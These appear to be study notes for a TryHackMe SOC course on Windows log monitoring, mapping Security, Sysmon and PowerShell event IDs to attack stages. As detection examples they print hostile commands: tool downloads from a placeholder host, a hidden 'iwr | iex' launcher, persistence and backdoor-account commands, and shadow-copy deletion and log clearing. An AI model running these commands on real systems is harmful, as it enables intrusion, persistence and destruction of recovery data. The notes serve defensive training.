# TryHackMe SOC Level 1 — Windows Security Monitoring

Most corporate endpoints run Windows, so most endpoint alerts come from Windows logs. This module covers which logs matter (Security, Sysmon, PowerShell), then follows an attack through them stage by stage: **initial access → discovery & collection → C2, persistence & impact**.

**Rooms:** Windows Logging for SOC · Windows Threat Detection 1 · Windows Threat Detection 2 · Windows Threat Detection 3

**Skills covered:** Event Viewer & EVTX · logon types & Logon ID correlation · user-management events · Sysmon process/file/network/registry events · PowerShell logging · RDP, phishing & USB initial access · discovery commands · staging & exfil · ingress tool transfer · scheduled tasks, services, Run keys · impact

---

## Windows Logging for SOC

Windows logs are stored as binary **`.evtx`** files (`C:\Windows\System32\winevt\Logs\`) and read with **Event Viewer** (`eventvwr`). Each entry has a log source, keywords (Audit Success/Failure), a timestamp, an **Event ID** and the event details.

### Security log: authentication
| ID | Event |
|---|---|
| **4624** | Successful logon |
| **4625** | Failed logon |
| 4634 / 4647 | Logoff |
| 4688 | Process creation (needs auditing enabled. Sysmon 1 is richer) |

**Logon types (field in 4624/4625):**
| Type | Meaning |
|---|---|
| 2 | Interactive (at the keyboard) |
| **3** | **Network** (SMB, mapped drives, and RDP's NLA pre-auth step) |
| 5 | Service |
| **10** | **RemoteInteractive (RDP)** |

**Logon ID** identifies the session. Every event from that session carries the same Logon ID, so you can tie "who logged in" to "what they did."

**Patterns:**
- **Brute force:** many 4625s for *one* account from one IP
- **Password spraying:** 4625s across *many* accounts with a few attempts each
- **Success after failures:** 4625 × N followed by a 4624 from the same IP = a password was guessed

### Security log: user management
| ID | Event |
|---|---|
| **4720** | Account created |
| 4722 / 4725 | Account enabled / disabled |
| 4726 | Account deleted |
| 4738 | Account changed |
| 4723 / 4724 | Password change (by the user) / reset (by an admin) |
| **4732** / 4733 | Added to / removed from a local group |

**Backdoor account pattern:** `4720` (new user) → `4732` (added to **Administrators** or Remote Desktop Users), especially at an odd hour or done by an unusual account.

### Sysmon
A Sysinternals driver that logs far more detail than the built-in logs, configured by an XML file (e.g. Florian Roth's or SwiftOnSecurity's config).
| ID | Event | Why it matters |
|---|---|---|
| **1** | Process creation | Command line, **hashes**, **parent process**, user. The single most useful event |
| **3** | Network connection | Which *process* connected where (C2 beacons) |
| **11** | File created | Dropped payloads, files in staging folders |
| **13** | Registry value set | Persistence (Run keys) |
| **22** | DNS query | Which process resolved which domain |

**Process trees:** link `ProcessId` → `ParentProcessId` to rebuild the chain.
```
explorer.exe → WINWORD.EXE → cmd.exe → powershell.exe -enc ...     ← malicious macro
```
Check hashes and IPs/domains from these events on VirusTotal.

### PowerShell logging
Process creation only shows `powershell.exe` launching. It doesn't show the commands typed inside an interactive session. To fill that gap:
- **PSReadLine history:** `%APPDATA%\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt` (every command typed interactively, per user)
- **Script Block Logging:** Event **4104** in *Microsoft-Windows-PowerShell/Operational*, which records the de-obfuscated code that actually ran

File/registry auditing (when enabled): **4656** (handle requested on an object), **4657** (registry value modified).

---

## Windows Threat Detection 1 — Initial Access

Two families: **exposed services** (attack the machine directly) and **user-driven** (trick a person into running something).

### RDP (T1133 External Remote Services)
Internet-exposed RDP is constantly brute-forced (Censys shows millions of hosts exposed).
```
4625 × hundreds, LogonType 3, one external IP   → brute force (NLA checks creds over a network logon)
4624 LogonType 10 from that same IP              → they got in
```
Then follow that **Logon ID** into Sysmon to see what the attacker did next.

### Phishing (T1566)
**Download chain:** browser downloads a ZIP → user extracts it (7-Zip, Explorer) → opens the "document" → the payload runs.
In logs: Sysmon **11** (file created in `Downloads`) → **11** (extracted file) → Sysmon **1** with **`explorer.exe` as the parent** (the user double-clicked it).

**Tricks:**
- **Double extensions (T1036.007):** `invoice.pdf.exe`. Windows hides known extensions by default, so the user sees `invoice.pdf`
- **Executable extensions that don't look like it:** `.scr`, `.com`, `.cpl`, `.hta`, `.js`, `.vbs`
- **LNK files:** a shortcut whose target is `powershell.exe -w hidden -c "iwr ... | iex"` (used to deliver RemcosRAT in the room's example)

### USB (T1091 Replication Through Removable Media)
Process creation with an image path on a **removable drive letter** (`E:\`, `F:\`), often an LNK or executable placed to look like a folder. Some malware copies itself onto every USB inserted, which is how it spreads. Other exposed-service paths include exploiting public-facing apps (**T1190**), like the room's print service case.

---

## Windows Threat Detection 2 — Discovery, Collection, Ingress

### Discovery (TA0007)
Right after getting in, attackers figure out where they are. Watch for bursts of these in Sysmon 1 / 4688, especially from `cmd.exe` or `powershell.exe` spawned by something unusual:
| Goal | Commands |
|---|---|
| Who am I | `whoami /all`, `echo %username%` |
| What is this host | `systeminfo`, `hostname`, `ver` |
| Network | `ipconfig /all`, `arp -a`, `netstat -ano`, `route print` |
| Users & groups | `net user`, `net localgroup administrators`, `net group "Domain Admins" /domain` |
| Domain | `nltest /dclist:`, `net view` |
| Software & AV | `tasklist`, `wmic product get name`, `Get-MpComputerStatus` |

**One `whoami` is normal. Ten recon commands in 30 seconds from the same parent process is not.** Reconstruct the process tree back to its origin to find the initial access.

### Collection (TA0009)
Finding and gathering data worth stealing:
```
findstr /si password *.txt *.xml *.config     # credential hunting
dir /s C:\Users\*.docx *.xlsx *.pdf
Compress-Archive -Path C:\Finance -DestinationPath C:\Users\Public\a.zip
```
**Staging folders:** `C:\Users\Public`, `%TEMP%`, `C:\ProgramData`, `C:\Windows\Temp`. If Sysmon 11 shows a large archive created there, check for an outbound transfer (Sysmon 3) straight after: that's **exfiltration**.

### Ingress Tool Transfer (T1105)
Pulling tools (Mimikatz, scanners, RATs) onto the host, often with built-in **LOLBins** (living-off-the-land binaries):
```
certutil -urlcache -split -f http://x.x.x.x/a.exe a.exe
bitsadmin /transfer j http://x.x.x.x/a.exe C:\Users\Public\a.exe
powershell iwr http://x.x.x.x/a.exe -OutFile a.exe
curl -o a.exe http://x.x.x.x/a.exe
```
Detect: Sysmon **1** command lines containing URLs, Sysmon **3** from `certutil`/`bitsadmin`, Sysmon **11** new `.exe`/`.dll` in a staging folder.

---

## Windows Threat Detection 3 — C2, Persistence, Impact

### Command & Control (TA0011)
The implant calls home at regular intervals (**beaconing**) to get instructions.
- Sysmon **3**: the same process connecting to the same external IP every N seconds, or a process that shouldn't use the network at all (`rundll32.exe`, `notepad.exe`)
- Sysmon **22**: odd or newly registered domains, long random subdomains (DNS C2)
- Common channels: HTTP(S), DNS, legitimate cloud services

### Persistence (TA0003)
Surviving reboots and password changes.

| Technique | How it looks | Logs |
|---|---|---|
| **Scheduled task** (T1053.005) | `schtasks /create /sc onlogon /tn Updater /tr C:\Users\Public\a.exe` | Sysmon 1 (`schtasks.exe` command line), Security **4698** (task created) |
| **Service** (T1543.003) | `sc create Svc binPath= C:\ProgramData\a.exe start= auto` | System **7045** (service installed), Security 4697 |
| **Run keys** (T1547.001) | `reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v Upd /d C:\...\a.exe` | Sysmon **13** |
| **Startup folder** (T1547.001) | File dropped in `...\Start Menu\Programs\Startup\` | Sysmon **11** |
| **Backdoor account** (T1136) | `net user support P@ss /add` + add to admins | Security **4720 → 4732** |

**Red flags in any of these:** the binary lives in a user-writable path, has a random or "Updater"-style name, or was created by a process descended from the initial payload.

### Impact (TA0040)
The end goal, often ransomware:
```
vssadmin delete shadows /all /quiet          # remove recovery options
wbadmin delete catalog -quiet
bcdedit /set {default} recoveryenabled no
wevtutil cl Security                          # → Security 1102 "audit log cleared"
```
Plus mass file creation/renames (Sysmon 11) with a new extension, and ransom notes in every folder.

### Full chain recap
```
Initial Access   4625×N → 4624 type 10   | explorer.exe → invoice.pdf.exe
Discovery        whoami, net group, ipconfig (Sysmon 1)
Ingress          certutil -urlcache ... (Sysmon 1/3/11)
Collection       Compress-Archive → C:\Users\Public (Sysmon 11)
C2 / Exfil       beacon to external IP (Sysmon 3/22)
Persistence      schtasks / 7045 / Run key (4698, 7045, Sysmon 13)
Impact           vssadmin delete shadows, 1102
```
Each stage maps to an ATT&CK tactic, and each has an Event ID that reveals it.

**References:** Ultimate Windows Security Event ID Encyclopedia, MITRE ATT&CK Windows matrix.
